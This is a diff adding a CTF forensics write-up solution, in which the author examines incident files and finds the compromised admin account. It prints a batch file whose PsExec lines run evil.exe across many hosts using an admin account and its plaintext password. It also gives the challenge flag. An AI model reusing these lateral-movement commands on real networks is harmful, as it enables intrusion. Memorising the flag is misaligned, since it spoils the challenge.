@@ -1,7 +1,7 @@
 # Forensics - 9 challenges
 [Magic in the Hex (100 pts)](#magic-in-the-hex-100-pts)<br>
 [My Logs Know What You Did (125 pts)](#my-logs-know-what-you-did-125-pts)<br>
-[I Just Wanna Run (150 pts)](#i-just-wanna-run-150-pts) *no soln*<br>
+[I Just Wanna Run (150 pts)](#i-just-wanna-run-150-pts)<br>
 [Sharing Files and Passwords (150 pts)](#sharing-files-and-passwords-150-pts) *no soln*<br>
 [Still Believe in Magic? (150 pts)](#still-believe-in-magic-150-pts) *no soln*<br>
 [Et tu, Hacker? (200 pts)](#et-tu-hacker-200-pts) *no soln*<br>
@@ -78,11 +78,63 @@ MetaCTF{super_sus_st4ging_site_d0t_c0m}
 > 
 > The flag format will be `METAL\xxxxx`
 
+Downloading the zip and unzipping it, we see the following files:
+
+```
+$ ls
+incident017  __MACOSX
+
+$ cd incident017/
+
+$ ls
+ inventory.txt  'recovered files'  'user accounts.txt'
+```
+
+Lets check out `inventory.txt`:
+
+```
+$ cat inventory.txt | head
+original filepath
+
+included in zip:
+C:\share$\COPY.bat
+C:\share$\EXE.bat
+C:\share$\WMI.bat
+C:\share$\comps1.txt
+C:\share$\comps2.txt
+C:\share$\comps3.txt
+C:\share$\comps4.txt
+```
+
+Hm, `exe.bat` seems interesting. Lets look into that:
+
+```
+$ cd 'recovered files'/
+
+$ ls
+comps10.txt  comps12.txt  comps14.txt  comps16.txt  comps1.txt  comps3.txt  comps5.txt  comps7.txt  comps9.txt  exe.bat
+comps11.txt  comps13.txt  comps15.txt  comps17.txt  comps2.txt  comps4.txt  comps6.txt  comps8.txt  copy.bat    wmi.bat
+
+$ cat exe.bat | head
+start PsExec.exe -d @C:\share$\comps1.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps2.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps3.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps4.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps5.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps6.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps7.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps8.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps9.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+start PsExec.exe -d @C:\share$\comps10.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
+```
+
+I suspect that this is the user account that was compromised. And we can see the user was `METAL\timq-admin`.
+
 <div align="center">
 
 Flag:
 ```
-NOT SOLVED YET
+METAL\timq-admin
 ```
 [return to top](#top)</div>
 
